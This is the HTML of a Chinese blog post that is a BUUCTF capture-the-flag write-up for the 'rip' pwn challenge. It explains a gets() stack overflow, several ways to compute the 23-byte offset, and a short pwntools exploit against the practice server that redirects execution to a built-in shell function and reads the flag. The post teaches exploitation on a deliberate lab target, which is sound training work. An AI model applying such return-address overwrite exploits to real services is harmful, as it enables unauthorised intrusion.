@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>BUUCTF（2）-rip | YunL's Blog</title><meta name="author" content="YunL"><meta name="copyright" content="YunL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="参考链接：(buuctf) - pwn入门部分wp - rip – pwn1_sctf_2016 - J1ay - 博客园 (cnblogs.com)buuctf rip 详细wp - refrain-again - 博客园 (cnblogs.com) 0x01解题过程题目点击下载：pwn1 下载题目得到 pwn1，利用 file 命令查看 1$ file pwn1   通过file命令，我们得以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF（2）-rip">
+<meta property="og:url" content="http://example.com/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/index.html">
+<meta property="og:site_name" content="YunL&#39;s Blog">
+<meta property="og:description" content="参考链接：(buuctf) - pwn入门部分wp - rip – pwn1_sctf_2016 - J1ay - 博客园 (cnblogs.com)buuctf rip 详细wp - refrain-again - 博客园 (cnblogs.com) 0x01解题过程题目点击下载：pwn1 下载题目得到 pwn1，利用 file 命令查看 1$ file pwn1   通过file命令，我们得以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-09-22T07:31:58.000Z">
+<meta property="article:modified_time" content="2023-09-24T06:26:29.757Z">
+<meta property="article:author" content="YunL">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="BUUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'BUUCTF（2）-rip',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-24 14:26:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="YunL's Blog"><span class="site-name">YunL's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF（2）-rip</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-22T07:31:58.000Z" title="发表于 2023-09-22 15:31:58">2023-09-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-24T06:26:29.757Z" title="更新于 2023-09-24 14:26:29">2023-09-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUUCTF（2）-rip"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>参考链接：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Jlay/p/pwn_wp1.html">(buuctf) - pwn入门部分wp - rip – pwn1_sctf_2016 - J1ay - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/refrain-again/p/15001283.html">buuctf rip 详细wp - refrain-again - 博客园 (cnblogs.com)</a><br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/d9cdc598ccea4adf8265d8e2a425af29.png" alt="在这里插入图片描述"></p>
+<h1 id="0x01解题过程"><a href="#0x01解题过程" class="headerlink" title="0x01解题过程"></a><strong>0x01解题过程</strong></h1><p>题目点击下载：<a href="/download/pwn1">pwn1</a></p>
+<p>下载题目得到 pwn1，利用 file 命令查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ file pwn1</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/e46bcb53554c49eda560209ba66ed5f3.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>通过file命令，我们得以辨识该文件的类型。<br>可以发现，这是一个64位的文件，应该将pwn1用64位的IDA打开<br>1byte&#x3D;8bit，可得64位是8个字节，同理32位就是4个字节。</p>
+</blockquote>
+<p>然后我们可以通过checksec .&#x2F;filename查看保护机制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./pwn1</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/90fd90ae5fdc4a6584209ba9fee5a14a.png" alt="在这里插入图片描述"></p>
+<blockquote>
+<p>查看当前二进制文件的指令架构以及采取了哪些保护机制。<br>可知该题任何保护都没有打开，所以我们可以实现最简单的栈溢出</p>
+</blockquote>
+<p>将PWN1文件放入IDA中查看。View-Open subviews-Strings打开字符串窗口<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/9fdf0b0446da4006b336835a139ac9ea.png" alt="在这里插入图片描述"><br>发现 <strong>system</strong>和**&#x2F;bin&#x2F;sh**（存在漏洞）<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/4d2750daef5b410895683d47f8b7298f.png" alt="在这里插入图片描述"><br>打开main函数，F5反编译<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/6b346750958d40af88e1a857ecbbc2d4.png" alt="在这里插入图片描述"><br> <strong>gets</strong>函数</p>
+<blockquote>
+<p>gets函数的缓冲区是由用户本身提供，由于用户无法指定一次最多可读入多少字节，导致此函数存在巨大安全隐患。换句话来说，就是gets若没有遇到\n 结束，则会无限读取，没有上限。</p>
+</blockquote>
+<h2 id="得偏移量的方法①："><a href="#得偏移量的方法①：" class="headerlink" title="得偏移量的方法①："></a><strong>得偏移量的方法①：</strong></h2><p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/e35560d7bd93484da5170594b5bf79c3.png" alt="在这里插入图片描述"></p>
+<p>由<strong>char s[15]；</strong>可得，在main函数的栈帧中，划分了一个15字节的存储空间，s在上图的<strong>Local variables</strong>中，由**[rbp-Fh]**可得和rbp的距离为15字节<br>该程序是64位，则Caller’s rbp有8字节<br>偏移量15+8</p>
+<h2 id="得偏移量的方法②："><a href="#得偏移量的方法②：" class="headerlink" title="得偏移量的方法②："></a><strong>得偏移量的方法②：</strong></h2><p>回到main函数的图形化界面<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/c5a057ac0d514cf28ef717bdfa8406f0.png" alt="在这里插入图片描述"><br>双击<strong>s</strong><br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/34baca8946424f7b80fad9a31836a571.png" alt="在这里插入图片描述"></p>
+<p>偏移量为：15 + 8 &#x3D; 23 （64位+8；32位+4）</p>
+<h2 id="得偏移量的方法③："><a href="#得偏移量的方法③：" class="headerlink" title="得偏移量的方法③："></a><strong>得偏移量的方法③：</strong></h2><p>可以通过 pattern来计算偏移量</p>
+<p>对pwn1进行gdb调试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb pwn1</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/6331ba7d1f2d4dedb0df76e1d690d42f.png" alt="在这里插入图片描述"><br>生成溢出字符，需保证其长度能覆盖至RIP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pattern create 200</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/c2d920ea684c42e688b1b0f9671ce0d4.png" alt="在这里插入图片描述"><br>执行 r 或者 start 命令让程序运行。</p>
+<blockquote>
+<p>注意：start 命令执行后，还需执行 contin 命令</p>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/dcdd2bb396054a9c89c9d8a4a1205ea1.png" alt="在这里插入图片描述"><br>在 please input 后，将之前生成的溢出字符串粘贴上去。<br><strong>注意：不要加‘’</strong><br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/66e9dc63756242d1b9cad501cecae0ed.png" alt="在这里插入图片描述"><br>找到RBP的字符串</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pattern offset  nAACAA-A</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/0cf6f61a1a834d2eb83f4f79e99f74c8.png" alt="在这里插入图片描述"><br>这里计算出的偏移量。不需要考虑堆栈平衡。构造playload时，直接与系统调用地址相加就可。（64位+8；32位+4）<br>或者：<br>找到 stack 复制栈顶的字符串 （复制全部或者复制前4个字节），得出偏移地址<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/537232ea88014ebab7a9a961c4e1ee46.png" alt="在这里插入图片描述"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ pattern offset A(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line">or</span><br><span class="line">$ pattern offset AA(A</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/8e7a8233b43c4cf9a5aa53bc6e0683df.png" alt="在这里插入图片描述"><br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/3d4eb0a7b4124b61a06413079d8e065e.png" alt="在这里插入图片描述"></p>
+<h2 id="得偏移量的方法④："><a href="#得偏移量的方法④：" class="headerlink" title="得偏移量的方法④："></a><strong>得偏移量的方法④：</strong></h2><p>可以通过 cyclic来计算偏移量<br>生成200个有序字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic 200</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/73094f3ad69c4410820e763a9a265d29.png" alt="在这里插入图片描述"><br>gdb调试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gdb pwn1</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/98d3ba9f8fac4e63a5052c28a8feb18e.png" alt="在这里插入图片描述"><br>找到RBP的地址，cyclic -l 地址 计算偏移量</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic -l 0x6161666161616561</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/944ca79a087a4e289863c9c839c35329.png" alt="在这里插入图片描述"><br>这里计算出的偏移量。不需要考虑堆栈平衡。构造playload时，直接与系统调用地址相加就可。（64位+8；32位+4）<br>或者：<br>找到 stack 复制栈顶的字符串 （复制全部或者复制前4个字节），得出偏移地址<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/07870c5c1ffd4284ba5d3f8604e3bac3.png" alt="在这里插入图片描述"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cyclic -l agga</span><br><span class="line">or</span><br><span class="line">$ cyclic -l agaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/1fd29b46a0364c6eae26a1409a160a6f.png" alt="在这里插入图片描述"></p>
+<p>打开fun函数，F5反编译<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/82df383f9da843ef84571d6b66718386.png" alt="在这里插入图片描述"><br>回到图形化界面<br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/4867c5a92d714bcd90ac0b1e44cb70fe.png" alt="在这里插入图片描述"><br>双击<strong>rbp</strong><br><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/0a25e6175e2e49ee8030d591f06a0591.png" alt="在这里插入图片描述"><br>得到地址：0x401186</p>
+<h1 id="0x02编写exp"><a href="#0x02编写exp" class="headerlink" title="0x02编写exp"></a><strong>0x02编写exp</strong></h1><blockquote>
+<p>exp编写步骤：<br>from pwn import *#引入pwn库<br>p &#x3D; remote(ip, port) #输入对应的ip地址和端口号来连接其他主机的服务<br>payload&#x3D;…+…  #输入payload来进行操作以拿到程序的shell<br>                 #payload一般为偏移量+地址<br>p.sendline(payload)  #用sendline（）将payload向程序输入，程序接收payload对某些变量赋值。<br>p.interactive() #反弹shell</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, 25990)</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span> * 23 + p64(0x401186 + 1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>①上述 payload中 <code>&#39;a&#39;</code> 可以替换成任意字母。</p>
+<p>②字符串中的’b’字符前缀使变量成为字节类型。<br>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cumt30111/article/details/107767316">Python中的字符串文字前的’b’字符做什么？_cumt30111的博客-CSDN博客</a></p>
+<p>为了防止python3运行时出现以下错误。 &#x2F;&#x2F; python2无事。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError: can only concatenate str (not &quot;bytes&quot;) to str</span><br></pre></td></tr></table></figure>
+
+<p>③+1 是为了保证堆栈平衡（不加一在本地可以打通，但是却打不通远程）</p>
+<p>打开终端，输入vim 1.py 创建一个python文件（命名随意）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ vim 1.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/972f2b39211c4d0884cbef6476975f5f.png" alt="在这里插入图片描述"><br>将exp文件输入进1.py中，Esc+:wq保存并退出1.py</p>
+<p>夺flag<br>运行代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python3 1.py</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/013d24dcb75945a99758b615f05abeee.png" alt="在这里插入图片描述"><br>将得到的flag复制到题目的flag框中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;7873e85b-15fe-4fd0-92d8-d6b15acfe027&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/c95ad0c960b842d78c14cdffc4e0acaa.png" alt="在这里插入图片描述"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">YunL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/">http://example.com/2023/09/22/BUUCTF%EF%BC%882%EF%BC%89-rip/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">YunL's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/22/BUUCTF%EF%BC%883%EF%BC%89-warmup-csaw-2016/" title="BUUCTF（3）-warmup-csaw-2016"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF（3）-warmup-csaw-2016</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/21/BUUCTF%EF%BC%881%EF%BC%89-test-your-nc/" title="BUUCTF（1）-test-your-nc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF（1）-test-your-nc</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/21/BUUCTF%EF%BC%881%EF%BC%89-test-your-nc/" title="BUUCTF（1）-test-your-nc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">BUUCTF（1）-test-your-nc</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%883%EF%BC%89-warmup-csaw-2016/" title="BUUCTF（3）-warmup-csaw-2016"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（3）-warmup-csaw-2016</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%884%EF%BC%89-ciscn-2019-n-1/" title="BUUCTF（4）-ciscn-2019-n-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（4）-ciscn-2019-n-1</div></div></a></div><div><a href="/2023/09/22/BUUCTF%EF%BC%885%EF%BC%89-pwn1-sctf-2016/" title="BUUCTF（5）-pwn1-sctf-2016"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-22</div><div class="title">BUUCTF（5）-pwn1-sctf-2016</div></div></a></div><div><a href="/2023/09/18/MOCTF%202023%E8%A5%BF%E7%94%B5%20PWN1-test-nc/" title="MOCTF 2023西电 PWN1-test_nc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-18</div><div class="title">MOCTF 2023西电 PWN1-test_nc</div></div></a></div><div><a href="/2023/09/18/MOCTF2023%E8%A5%BF%E7%94%B5PWN3-fd/" title="MOCTF 2023西电 PWN3-fd"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-18</div><div class="title">MOCTF 2023西电 PWN3-fd</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YunL</div><div class="author-info__description">YunL的个人博客，什么都可能有</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01解题过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%81%8F%E7%A7%BB%E9%87%8F%E7%9A%84%E6%96%B9%E6%B3%95%E2%91%A0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">得偏移量的方法①：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%81%8F%E7%A7%BB%E9%87%8F%E7%9A%84%E6%96%B9%E6%B3%95%E2%91%A1%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">得偏移量的方法②：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%81%8F%E7%A7%BB%E9%87%8F%E7%9A%84%E6%96%B9%E6%B3%95%E2%91%A2%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">得偏移量的方法③：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%97%E5%81%8F%E7%A7%BB%E9%87%8F%E7%9A%84%E6%96%B9%E6%B3%95%E2%91%A3%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">得偏移量的方法④：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 